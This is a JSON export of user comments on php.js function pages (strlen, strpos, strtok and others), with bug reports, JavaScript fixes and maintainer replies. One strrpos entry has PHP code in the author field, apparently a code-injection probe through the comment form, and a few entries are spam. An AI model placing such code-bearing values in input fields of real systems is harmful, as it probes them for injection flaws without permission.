16:21:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Very well, I will leave it at \r\n[CODE=&quot;Javascript&quot;]\r\nreturn (string+'').length;\r\n[\/CODE]\r\nthen."},{"date":"2009-01-15 02:15:26","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"While the following may look like overkill, in order to be truly faithful to handling all Unicode characters and to this function in PHP which does not count the number of bytes but counts the number of characters, something like this is really necessary:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ Form a string with a form of the Han character for &quot;you&quot; surrounded by the letters A and Z\r\nvar str = 'A\\ud87e\\udc04Z'; \/\/ Including two &quot;surrogates&quot; which are used to form a single character in Unicode (so the count of this should be 3, not 4 as str.length will give)\r\n\/\/ var str = 'A\u00f0\u00af\u00a0\u201eZ'; \/\/ If your blogging software won't mess with the Unicode, you can try this equivalent example as well (should be 3, not 4 as str.length will give)\r\n\r\nalert(\r\n  strlen(str)\r\n);\r\n\r\n\/\/ Note that the exceptions will only be thrown if the string is poorly formed Unicode (something unlikely unless it was deliberate--e.g., try taking out one of the surrogate pairs above).\r\n\/\/ Also note that although it will indeed be rare, especially for Western scripts, that str.length would not handle the situation correctly, in order to support handling of all languages that can be expressed in Unicode, the following is necessary.\r\n\r\nfunction strlen (str) {\r\n\tfunction getWholeChar (str, i) {\r\n\t\tvar code = str.charCodeAt(i);\r\n\t\tif (0xD800 &lt;= code &amp;&amp; code &lt;= 0xDBFF) { \/\/ High surrogate(could change last hex to 0xDB7F to treat high private surrogates as single characters)\r\n\t\t\tif (str.length &lt;= (i+1))  {\r\n\t\t\t\tthrow 'High surrogate without following low surrogate';\r\n\t\t\t}\r\n\t\t\tvar next = str.charCodeAt(i+1);\r\n\t\t\tif (0xDC00 &gt; next || next &gt; 0xDFFF) {\r\n\t\t\t\tthrow 'High surrogate without following low surrogate';\r\n\t\t\t}\r\n\t\t\treturn str[i]+str[i+1];\r\n\t\t}\r\n\t\telse if (0xDC00 &lt;= code &amp;&amp; code &lt;= 0xDFFF) { \/\/ Low surrogate\r\n\t\t\tif (i === 0) {\r\n\t\t\t\tthrow 'Low surrogate without preceding high surrogate';\r\n\t\t\t}\r\n\t\t\tvar prev = str.charCodeAt(i-1);\r\n\t\t\tif (0xD800 &gt; prev || prev &gt; 0xDBFF) { \/\/(could change last hex to 0xDB7F to treat high private surrogates as single characters)\r\n\t\t\t\tthrow 'Low surrogate without preceding high surrogate';\r\n\t\t\t}\r\n\t\t\treturn false; \/\/ We can pass over low surrogates now as the second component in a pair which we have already processed\r\n\t\t}\r\n\t\treturn str[i];\r\n\t}\r\n\tfor (var i=0, lgth=0; i &lt; str.length; i++) {\r\n\t\tif ((chr = getWholeChar(str, i)) === false) {continue;} \/\/ Adapt this line at the top of any loop, passing in the whole string and the current iteration and returning a variable to represent the individual character; purpose is to treat the first part of a surrogate pair as the whole character and then ignore the second part\r\n\t\tlgth++;\r\n\t}\r\n\treturn lgth;\r\n}[\/CODE]\r\n\r\n(By the way on an unrelated note, I see shuffle() and possibly some other array functions also need to be made to work with associative arrays (just correcting myself about only a few needing it).)"},{"date":"2009-01-15 02:22:19","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Oh sorry, in order to convert to string, you can add the line \r\n\r\n[CODE=&quot;Javascript&quot;]str = str+'';[\/CODE]\r\n\r\nas the very first line in strlen() (before getWholeChar()).\r\n\r\nBy the way, I do see that your blogging software does not convert the character in my 2nd example into entities, so you can try that example too.  Best, Brett"},{"date":"2009-01-15 11:39:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: wow. I don't usually have to deal with these things. more kuddos to you, man."}],"strnatcasecmp":[{"date":"2010-05-25 03:15:24","author":"Devan Penner-Woelk","url":"","comment":"Due to the script, when using the 'Packed' compression method, the double semi-colon (;;) on line 32:\n[code]for (;; ia++, ib++)[\/code]\nis packed into only one (1) semi-colon:\n[code]for (; ia++, ib++)[\/code]\n\nThis causes the entire JavaScript package to fail."},{"date":"2010-06-19 15:55:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Devan Penner-Woelk: Thanks! Fixed: http:\/\/github.com\/kvz\/phpjs\/commit\/8ccb16793597a1fa6cabd6db2ad7a2baedf504f8"},{"date":"2011-02-05 15:07:16","author":"Adrian","url":"http:\/\/www.radio-exodus.de","comment":"This function is broken. strnatcasecmp('2', '3') === 0"},{"date":"2011-02-05 18:59:41","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Adrian: thanks for your bug report. I commited a fix to Git repo."},{"date":"2011-05-25 15:32:59","author":"Adrian","url":"","comment":"strnatcasecmp('a', 'a') --> endless loop (most recent code from git)"}],"strnatcmp":[{"date":"2008-03-01 18:41:23","author":"Martijn Wieringa","url":"","comment":"The args 'f_version' is missing in the function definition.\r\n\r\nI've added this tag to fix the following problem:\r\n\r\nWhen you're comparing numbers in a string.. like:\r\n\r\n&quot;Price 12.9&quot;\r\n&quot;Price 12.15&quot;\r\n\r\nYou want: &quot;Price 12.9&quot; &gt; &quot;Price 12.15&quot;.\r\n\r\nYet when you use numbers to indicate version numbers.. Like\r\n\r\n&quot;Version 12.9&quot;\r\n&quot;Version 12.15&quot;\r\n\r\nYou want: &quot;Price 12.9&quot; &lt; &quot;Price 12.15&quot;."},{"date":"2008-03-01 21:01:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martijn Wieringa: Though our aim has always been to copy the PHP specs of all the functions as strict as possible, I could see why you would want this functionality. And given the fact that not using the extra parameter doesn't effect it's behaviour, I will be happy to  make an exception in this case. Thanks again"}],"strncasecmp":[{"date":"2008-09-23 03:55:56","author":"Nate","url":"","comment":"Slight grammar error:\r\n        \/\/ avoids trying to get a char that does not exists\r\nshould be\r\n        \/\/ avoids trying to get a char that does not exist\r\n\r\nAlso for comment:\r\n            \/\/ str1 is lengthier than str2\r\n&quot;longer&quot; might be better than &quot;lengthier&quot;; however, that is more of an opinion."},{"date":"2008-09-24 11:31:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate: Fixed, thank you!"}],"strpbrk":[{"date":"2009-07-21 17:49:36","author":"Christoph","url":"","comment":"Doesn't work in IE as IE can't acces characters by array subscription - you'll have to use charAt() instead! Also, it replicates built-in functionality.\n\nA better implementation:\n[code]\nfunction strpbrk(string, chars) {\n    for(var i = 0, len = string.length; i < len; ++i) {\n        if(chars.indexOf(string.charAt(i)) >= 0)\n                return string.substring(i);\n    }\n\n    return false;\n}\n[\/code]"},{"date":"2009-07-24 12:21:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Christoph: Cool man, much shorter, no IE problems & passes testcases. So I'm happy. Thanks for the code! (will be online shortly)"}],"strpos":[{"date":"2008-08-25 18:47:38","author":"oooooooooooo","url":"","comment":"Thank you!"},{"date":"2008-09-06 00:43:42","author":"Kirk Strobeck","url":"weareinto.com","comment":"This is great. Just what I needed. This small conversion basically means you don't need to learn JavaScript if you know PHP. Nice."},{"date":"2008-09-08 00:16:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"I would still learn JS if I was you.. Don't miss out on beautiful things like jQuery. PHP.JS is just a tool to smoothen up the edges between client &lt;&gt; server interaction development."},{"date":"2008-09-09 20:19:10","author":"steve","url":"","comment":"ok, here's where I get real lost.\r\n\r\nI get the point about trying to port the functions - fine.\r\n\r\nbut strpos()?\r\n\r\nthis function in PHP has a HORRIBLE bug where it sometimes returns an int, and sometimes a boolean, and worse yet if the string you want is at the zero index, what do you test for?\r\n\r\nIn JavaScript, all string objects have a .indexOf() and a .lastIndexOf() function that work (IMHO) better than the PHP one, in fact I've seen many libs mimic the JS behavior in a PHP version of index_of()\r\n\r\nJS .indexOf()\r\n\r\nreturns the (zero based index as an integer (if found))\r\nelse\r\nreturns the integer -1 (e.g. not found)\r\n\r\nThis works much better as you can have logic like.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif(someString.indexOf('secretcode')){\r\n  \/\/do your magic\r\n}\r\n[\/CODE]\r\n\r\nif you *need* the offset option, you can accomplish with:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction index_of(haystack, needle, offset){\r\n  if(offset){\r\n    haystack = haystack.substr(offset);\r\n  }\r\n  return haystack.indexOf(needle);\r\n}\r\n[\/CODE]\r\n\r\n\r\nThen again, maybe I'm missing the point of this exercise?"},{"date":"2008-09-13 15:28:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ steve: Well it would be nice if you can copy-paste generic PHP code into a .JS file, and it still works. Straying from the PHP path, means developers have yet another variable to keep track of.. Does this function behave differently from the original PHP function, just because PHP.JS developers think they're smarter?\r\nSo we've chosen to stick with PHP and duplicate all of it's features.. and even flaws."},{"date":"2008-10-04 17:25:34","author":"Onno Marsman","url":"","comment":"Improved to accept things other than strings like in PHP, and a little optimiztion in the return line ( I used === instead of &gt;=)\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strpos( haystack, needle, offset){\r\n    var i = (haystack+'').indexOf( needle, offset ); \r\n    return i===-1 ? false : i;\r\n}\r\n[\/CODE]"},{"date":"2008-10-06 12:07:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Good job!"},{"date":"2009-01-19 16:37:31","author":"mb","url":"","comment":"I've noticed that this function does not find for example &quot;ABC&quot; in &quot;ABCand.so.on&quot;.\r\n\r\nBug: if first char of needle is first char of haystack, this does not work."},{"date":"2009-01-20 02:14:07","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@mb : It does work with your example. You just have to keep in mind that because the index position (array indexes start at 0) in your case is '0', it will return 0, so you cannot use it as a boolean like:\r\n\r\n[CODE=&quot;Javascript&quot;]if (strpos(&quot;ABCand.so.on&quot;, &quot;ABC&quot;))[\/CODE]\r\n\r\nbecause that will indeed not be executed.\r\n\r\nIf you ran into this problem, the solution is to do this in your code:\r\n\r\n[CODE=&quot;Javascript&quot;]if (strpos(&quot;ABCand.so.on&quot;, &quot;ABC&quot;) === false)[\/CODE]\r\n\r\nwhich will be executed"},{"date":"2009-01-20 02:16:36","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Argh... Sorry, I meant to say that this would be executed in your example:\r\n[CODE=&quot;Javascript&quot;]if (strpos(&quot;ABCand.so.on&quot;, &quot;ABC&quot;) === 0)[\/CODE]\r\n\r\nbut this would not\r\n[CODE=&quot;Javascript&quot;]if (strpos(&quot;ABCand.so.on&quot;, &quot;ABC&quot;) === false)[\/CODE]"},{"date":"2009-01-20 02:24:19","author":"anonymous","url":"","comment":"[CODE]\nyour_stuff('ghatiya');\n[\/CODE]\n"},{"date":"2009-04-29 07:46:45","author":"Khurram Adeeb Noorani","url":"www.visualcv.com\/kanoorani","comment":"Hi,\nThanks for the wonderful functions, they helped me a lot ... Bu what I think is that we need only those functions that are not available in javascript, there is no need of strpos(), explode(), substr() etc, as they are already available in javascript as indexOf() and split() and substr()"},{"date":"2009-04-29 15:29:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Khurram Adeeb Noorani: Other people do like that. But that's ok. Just compile your own version without the 'duplicate' functions! "},{"date":"2009-04-30 04:03:45","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@ Khurram Adeeb Noorani: Also note that the PHP functions have some extra functionality (e.g,. str_replace() can be used with arrays) or extra arguments (like strpos's offset). Besides, for those only familiar with PHP, they can fall back on the PHP names as need be."},{"date":"2010-03-25 16:25:24","author":"Chris","url":"","comment":"I really don't understand why you think this works - even your example isn't correct. Find the first occurence of 'e' in 'Kevin van Zonneveld', and you think the answer should be 14? Hmm what about the 'e' in 'Kevin', the first word, and the second letter??\n\nTry to find 'v' and it will come back with 6, missing the 'v' in 'Kevin' once more."},{"date":"2010-03-26 06:55:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Chris: Try dropping the third argument (or setting it to 0) which sets a starting point. It is working correctly..."},{"date":"2010-04-15 14:05:31","author":"myltik","url":"http:\/\/chupakabr.ru","comment":"thanks for script , works fine for me :-)"},{"date":"2010-06-01 16:58:08","author":"Eugene","url":"","comment":"indexOf is not working in IE"},{"date":"2010-06-02 11:19:03","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Eugene: indexOf does not work in IE arrays, but it does exist on strings in IE..."},{"date":"2010-08-08 09:55:33","author":"Sly","url":"http:\/\/ncorp.hu","comment":"In the example there is a \"5\": \n[code]\nstrpos('Kevin van Zonneveld', 'e', 5);\n[\/code]\n\nIf you see, it means, fnc strpos will search for 'e' after the 5th position of haystack string. Try the example with 0. ;) Like this: \n\n[code]\nstrpos('Kevin van Zonneveld', 'e', 0);\n[\/code]\n\n\n>>>>>I really don't understand why you think this works - even your example isn't correct. Find the first occurence of 'e' in 'Kevin van Zonneveld', and you think the answer should be 14? Hmm what about the 'e' in 'Kevin', the first word, and the second letter??\n\nTry to find 'v' and it will come back with 6, missing the 'v' in 'Kevin' once more."},{"date":"2010-09-08 17:48:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Sly: Thanks for helping Chris make sense of this : )"},{"date":"2011-03-16 20:33:11","author":"ELIANE","url":"","comment":"TENHO MINHA SENHA MAIS N\u00c3O CONSIGO ENTRAR NO MEU HOTMAIL"},{"date":"2011-06-21 09:11:35","author":"kirk bushell","url":"http:\/\/www.kirkbushell.com","comment":"I don't understand the need for a library like this - why not simply learn the language and learn the functions that are available rather than holding onto a language that you love? By learning you become a better developer, rather than writing wrappers for problems that don't exist."},{"date":"2011-06-21 18:59:53","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@kirk bushell: Please read the second question on our FAQ: https:\/\/github.com\/kvz\/phpjs\/wiki\/FAQ about use of JavaScript."},{"date":"2011-09-30 11:26:34","author":"JaypeeHuda","url":"","comment":"Hello Everyone,\nThe strpos() function is used to search for a character\/text  within a string. i.e. with the help of strpos() function  you can search a specific character or specific text string. If match is found, strops() function will returns character position of first match. If no match is found, it will return false (Nothing to display).............................. for more details please check out following link...\n\nhttp:\/\/mindstick.com\/Articles\/4550476c-822d-4506-b41f-edf5ec8228a7\/?PHP%20String%20function\n\nthanks !!!!"}],"strrchr":[{"date":"2009-05-29 10:12:42","author":"Jason Wong","url":"carrot.org","comment":"This function seems can not work properly in IE but works fine in firefox. For example, strrchr(\"java.js\",\".\"), it will always return false. The reason is that the needle is currently a string, however, needle[0] is undefined. \r\nGood Luck."},{"date":"2009-05-29 19:03:22","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Thanks, Jason...Fixed in SVN (using needle.charAt(0))."}],"strrev":[{"date":"2009-02-28 06:07:55","author":"Silas - shut","url":"","comment":"Simples e Muito \u00fatil, parab\u00e9ns."},{"date":"2008-01-19 19:50:26","author":"Legaev Andrey","url":"","comment":"Ajaxian replacements of file_get_contents() and file():\r\n[CODE=&quot;Javascript&quot;]\r\nfunction file_get_contents(url) {\r\n\t\/\/ +\toriginal by: Legaev Andrey\r\n\t\/\/ *\tnote:\tWhis function uses XmlHttpRequest and cannot retrieve resource from different domain.\r\n\tvar req = null;\r\n\ttry { req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); } catch (e) {\r\n\t\ttry { req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } catch (e) {\r\n\t\t\ttry { req = new XMLHttpRequest(); } catch(e) {}\r\n\t\t}\r\n\t}\r\n\tif (req == null) throw new Error('XMLHttpRequest not supported');\r\n\t\r\n\treq.open(&quot;GET&quot;, url, false);\r\n\treq.send(null);\r\n\r\n\treturn req.responseText;\r\n}\r\n\r\nfunction file(url) {\r\n\t\/\/ +\toriginal by: Legaev Andrey\r\n\t\/\/ *\tnote:\tWhis function uses XmlHttpRequest and cannot retrieve resource from different domain.\r\n\tvar req = null;\r\n\ttry { req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); } catch (e) {\r\n\t\ttry { req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } catch (e) {\r\n\t\t\ttry { req = new XMLHttpRequest(); } catch(e) {}\r\n\t\t}\r\n\t}\r\n\tif (req == null) throw new Error('XMLHttpRequest not supported');\r\n\t\r\n\treq.open(&quot;GET&quot;, url, false);\r\n\treq.send(null);\r\n\r\n\treturn req.responseText.split('\\n');\r\n}\r\n[\/CODE]"},{"date":"2008-01-19 20:53:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Legaev Andrey: wicked :)"}],"strrpos":[{"date":"2008-01-30 01:29:09","author":"speedmax","url":"","comment":"I been coding php for 7 years, good work but why the hell would you want to do that.. ?\r\n\r\n\r\njavascript is a better language, its more of a functional language with array\/hash shortcut, iterator, closure for free. \r\n\r\ntry to do this in php\r\n\r\n['you','and','me'].map(function(item){ \r\n         return item.toUpperCase() \r\n}).join(' ')"},{"date":"2008-01-30 01:35:29","author":"speedmax","url":"","comment":"that was showing lamda in the work,  here is one liner to the purist. \r\n\r\nBeauty and the Beast\r\n[CODE=&quot;Javascript&quot;]\r\n['you','and','me'].map(String.toUpperCase).join(' ')\r\n[\/CODE]\r\n\r\n[CODE=&quot;PHP&quot;]\r\nimplode(' ', array_map('strtolower', array('you', 'and', 'me')))\r\n[\/CODE]"},{"date":"2008-01-30 05:16:21","author":"Abraham Estrada","url":"","comment":"Sorry guys but I think you are reinventing the wheel"},{"date":"2008-01-30 08:11:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Abraham Estrada: Yep, but sometimes you need a different set of wheels right?\r\n\r\n@ speedmax: \r\nAbout the PHP vs JS stuff.. I'm not trying to port or emulate the entire language or control structures of PHP. Indeed I don't see the need because Javascript seems to have more elegant features in that category anyway.\r\n\r\nHowever in my eyes, PHP does provide a large set of standard functions that make developing very easy, and some of them don't have good standard Javascript implementations, though they often would be great to have client-side.\r\n\r\nSo in this project by also providing the functions separately, I hope to keep people from inventing the wheel and give them a head start."},{"date":"2010-01-06 11:35:09","author":"saulius","url":"","comment":"var i = (haystack+'').lastIndexOf( needle, offset );\nreturn i >= 0 ? i : false;\n\/\/strrpos(somepage.com, '.', false); returns false\n\n\nif (offset)\n{\n    \tvar i = (haystack+'').lastIndexOf(needle, offset);\n}\nelse\n{\n    \tvar i = (haystack+'').lastIndexOf(needle);\n}"},{"date":"2010-01-07 07:31:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"I don't have time to test myself now, but there is also this issue:\n\n[CODE]var_dump(strrpos(\"canal\", \"a\", 3)); \/\/ PHP and php.js gives 3\nvar_dump(strrpos(\"canal\", \"a\", 4)); \/\/ PHP gives false while php.js gives 3\n[\/CODE]\n\nSeems the offset behaves differently, maybe from the opposite direction. So before adding saulius' changes, someone please take a look."},{"date":"2010-01-08 11:07:08","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@saulius, thanks again, I've now incorporated your fix and the issue I mentioned: http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/strings\/strrpos.js . The problem is that the 2nd argument to lastIndexOf() works very differently from strrpos's offset argument (see the comments for an explanation)."},{"date":"2012-08-24 21:48:16","author":"$client = new SoapClient(\"some.wsdl\"); $client->SomeFunction","url":"354","comment":"545"}],"strspn":[{"date":"2008-12-18 01:49:13","author":"Brett Zamir","url":"","comment":"I think this should add the other two args...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\r\nstrspn('42 is the answer, what is the question ...', '1234567890');\r\nstrspn(&quot;foo&quot;, &quot;o&quot;, 1, 2); \/\/ 2\r\n\r\nfunction strspn(str1, str2, start, lgth){\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Valentina De Rosa\r\n    \/\/ %        note 1: Good start, but still missing the 3rd &amp; 4th argument which came to PHP in version 4.3.0\r\n    \/\/ *     example 1: strspn('42 is the answer, what is the question ...', '1234567890');\r\n    \/\/ *     returns 1: 2\r\n \r\n    var found;\r\n    var stri;\r\n    var strj;\r\n    var j = 0;\r\n    var i = 0;\r\n \r\n    start = start ? (start &lt; 0 ? (str1.length+start) : start) : 0;\r\n    lgth = lgth ? ((lgth &lt; 0) ? (str1.length+lgth-start) : lgth) : str1.length-start;\r\n    str1 = str1.substr(start, lgth);\r\n\r\n    for(i = 0; i &lt; str1.length; i++){\r\n        found = 0;\r\n        stri  = str1.substring(i,i+1);\r\n        for (j = 0; j &lt;= str2.length; j++) {\r\n            strj = str2.substring(j,j+1);\r\n            if (stri == strj) {\r\n                found = 1;\r\n                break;\r\n            }\r\n        }\r\n        if (found != 1) {\r\n            return i;\r\n        }\r\n    }\r\n \r\n    return i;\r\n}[\/CODE]"},{"date":"2008-12-30 10:22:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Good job man, added!"},{"date":"2011-01-07 19:20:46","author":"Orme","url":"","comment":"I understand that it's not in format, but using regexp in this function is faster in all browsers.\n[CODE]\nfunction strspn (str1, str2, start, lgth) {\n\tstr1 = start ? lgth ? str1.substr(start, lgth) : str1.substr(start) : str1;\n\tvar match = str1.match(new RegExp('^['+str2+']+'));\n\treturn match && match[0] ? match[0].length : 0;\n}\n[\/CODE]"},{"date":"2011-01-08 15:23:12","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Orme: You'll need to escape str2 (e.g., by using preg_quote: http:\/\/phpjs.org\/functions\/preg_quote:491 ) since the RegExp could be problematic if special characters are added without escaping. Could you check whether the performance is still better after such escaping is done and then if it passes some test cases, we could accept it."},{"date":"2011-01-08 15:34:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Orme: Also, in seeing now that str2 is added within a character class in your implementation, you wouldn't need to escape as many characters--only \\, ], and - should I think be enough for JS character classes, but you do need to escape them."},{"date":"2011-01-09 15:13:52","author":"Orme","url":"","comment":"Hmm, I used such string as str2 -- '\\0 \\t\\x0B' and it works fine without escaping. RegExp get already escaped string with exact characters you expect. One thing that matching should be multiline, so \\m modifier should be added."},{"date":"2012-04-11 15:44:22","author":"????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting"}],"strstr":[{"date":"2010-04-05 14:47:43","author":"Val Che","url":"http:\/\/chupakabr.ru","comment":"Thanks man! Works fine for me :-)"},{"date":"2010-12-16 13:46:28","author":"sarav","url":"http:\/\/urlsave.net","comment":"good resource for JavaScript ! was searching for long "},{"date":"2012-04-04 15:18:17","author":"Dipen","url":"","comment":"thank you very much"},{"date":"2012-05-24 07:16:22","author":"rahul","url":"http:\/\/howcan-i-getmoney.com","comment":"Thanks a lot, finally i got the answer in your post, thanks a lot"}],"strtok":[{"date":"2009-05-20 15:31:09","author":"Ty","url":"http:\/\/www.thedarkproject.de","comment":"Hi,\n\nthe function strtok() does NOT work as the PHP equivalent!!\nMy example:\n[CODE]\nString = \"@@abcdef# @#tzererff#\";\nresult = strtok(substr(stristr(String, \"@@\"), 2), \"#\");\n[\/CODE]\n==> abcdef# @#tzererff#\n--------\nIn PHP the same command line results in:\n==> abcdef\n\nWhat am I doing wrong??\n\nCheers Ty"},{"date":"2009-05-20 16:04:41","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"It's working fine for me. I presume you have the equivalents already for substr and stristr? Are you using regular client-side JavaScript? Did you check your results already for substr and stristr (those are executed before it gets to strtok).  Did you check the error console? What browser?\n\nIf you downloaded the namespaced version (e.g., calling the function like $P.strtok()), then I do see there is a bug (just fixed in Subversion), but otherwise, it seems we need more info, because it's working fine to return 'abcdef' for me."},{"date":"2009-05-20 16:06:46","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Also, while it shouldn't affect this situation, you probably don't want to be using \"String\" as a variable name (at least capitalized like that), since you are overwriting the built-in String() constructor."},{"date":"2009-05-20 16:16:50","author":"Ty","url":"http:\/\/www.thedarkproject.de","comment":"Hehe... I do not use String... It is just an example. I just wanted to show what commands I use.\n\nFor your questions:\nYes I tested the other outputs. They're working as expected. Only strtok() does NOT do what it should.\n\nHere's the original code:\n[CODE]\nfpSubject = fldRef[fldTitles[i]]['subject'][0];\nif(stristr(fldRef[fldTitles[i]]['category'][0], \"@@\")) {\n  fpCategory = strtok(substr(stristr(fldRef[fldTitles[i]]['category'][0], \"@@\"), 1), \"#\");\n} else fpCategory = fldRef[fldTitles[i]]['category'][0];\n[\/CODE]\n\nfldRef[fldTitles[i]]['category'][0] contains: \"Subarea=authorisation\\nModule\/Category=Create\\nTask=ERP @@xxy_yzaaddcc# @#qeq_reerfdfe#\"\n\nAs the result I get:\n\"xxy_yzaaddcc# @#qeq_reerfdfe#\"\n\nBut it should be:\n\"xxy_yzaaddcc\"\n\nOnly stristr gives:\n\"@@xxy_yzaaddcc# @#qeq_reerfdfe#\"\n\nAnd with substr: See above... ;-)\n\nAny clues?\n\nTy"},{"date":"2009-05-20 19:53:34","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"My other questions:\n1) Are you using regular client-side JavaScript?\n2) What browser are you using?\n3) Did you check the error console for your browser for any warnings?\n4) Did you download the namespaced version of PHP.JS or just copy-paste the function\/use the non-namespaced version?\n5) How long ago did you copy the code?\n\nAs I said I tested it myself just now in Firefox 3.0.10 as follows:\n\n[CODE]var str = \"Subarea=authorisation\\nModule\/Category=Create\\nTask=ERP @@xxy_yzaaddcc# @#qeq_reerfdfe#\";\nresult = strtok(substr(stristr(str, \"@@\"), 2), \"#\");\nalert(result); \/\/ [\/CODE]\n\nAnd it gives 'xxy_yzaaddcc' in Firefox. \n\nOr to make it simpler for our testing:\n\n[CODE]var sub = \"xxy_yzaaddcc# @#qeq_reerfdfe#\";\nresult = strtok(sub, \"#\");\nalert(result); \/\/ gives 'xxy_yzaaddcc' in Firefox[\/CODE]\n"},{"date":"2009-05-26 10:21:10","author":"Ty","url":"http:\/\/www.thedarkproject.de","comment":"Ah...\n\nNow I can see the error... In Firefox (3.5b4 and 3.0.10) it works fine.\nBut in Internet Explorer 7 it does NOT work. That's bad, because I will need it mainly for IE. :(\n\nAny suggestions?"},{"date":"2009-05-26 10:38:52","author":"Ty","url":"http:\/\/www.thedarkproject.de","comment":"Ok... It solved it in another way. I cannot use strtok() in IE.\nBut as you see below, this works.\n\n[CODE]\nvar str = \"Subarea=authorisation\\nModule\/Category=Create\\nTask=ERP @@xxy_yzaaddcc# @#qeq_reerfdfe#\";\nresult = strtok(substr(stristr(str, \"@@\"), 2), \"#\");\nalert(substr(result, 0, result.indexOf(\"#\")));\n[\/CODE]\n\nThis results the expected string. So I changed the code of the strtok() function, as follows.\n\n[CODE]\nfunction strtok (str, tokens) {\n\t\/\/ Tokenize a string \n\t\/\/\n\t\/\/ version: 905.2020\n\t\/\/ discuss at: http:\/\/phpjs.org\/functions\/strtok\n\t\/\/ +   original by: Brett Zamir (http:\/\/brettz9.blogspot.com)\n\t\/\/ %        note 1: Use tab and newline as tokenizing characters as well\n\t\/\/ *     example 1: $string = \"\\t\\t\\t\\nThis is\\tan example\\nstring\\n\";\n\t\/\/ *     example 1: $tok = strtok($string, \" \\n\\t\");\n\t\/\/ *     example 1: $b = '';\n\t\/\/ *     example 1: while($tok !== false) {$b += \"Word=\"+$tok+\"\\n\"; $tok = strtok(\" \\n\\t\");}\n\t\/\/ *     example 1: $b\n\t\/\/ *     returns 1: \"Word=This\\nWord=is\\nWord=an\\nWord=example\\nWord=string\\n\"\n\tif (!this.php_js) {\n\t\tthis.php_js = {};\n\t}\n\t\n\tif (navigator.appName == \"Microsoft Internet Explorer\") {\n\t\treturn str.substr(0, str.indexOf(tokens));\n\t}\n\t\n\tif (tokens === undefined) {\n\t\ttokens = str;\n\t\tstr = this.php_js.strtokleftOver;\n\t}\n\tif (str.length === 0) {\n\t\treturn false;\n\t}\n\tif (tokens.indexOf(str[0]) !== -1) {\n\t\treturn this.strtok(str.substr(1), tokens);\n\t}\n\tfor (var i=0; i < str.length; i++) {\n\t\tif (tokens.indexOf(str[i]) !== -1) {\n\t\t\tbreak;\n\t\t}\n\t}\n\tthis.php_js.strtokleftOver = str.substr(i+1);\n\treturn str.substring(0, i);\n}\n[\/CODE]\n\nThis works very well in IE 6, 7 and 8. :)\n\nThanks for your help!\n\nPS: Maybe you can integrate these change in your version? ;-)"},{"date":"2009-05-26 15:07:24","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Okay, I see... I only learned this recently, as I tend to live in the comfortable bubble of not needing to write for older IE browsers... :)  Your solution will not solve the problem either because that is not progressively tokenizing the string. What should solve it for IE and still work in other browsers is to change our accessing the strings by index (as though it were an array) and instead use charAt(). \n\nYou can therefore replace your code with the code we now show for strtok. I also fixed this problem in a few other functions, though I'm afraid there could be others besides these:\nsql_regcase, str_shuffle, strcspn, strlen, convert_cyr_string\n\nSorry I didn't pick up on it earlier. For future reference, it really helps if you can boil down the problem to just one function and the smallest example possible, and even the exact line within the function, since it is easy to do this with our mostly self-contained functions. But anyhow, thanks very much for sticking through it, and I'm very glad you found this problem for us...It will be a big help for cross-browser compatibility..."},{"date":"2012-04-11 15:45:25","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read 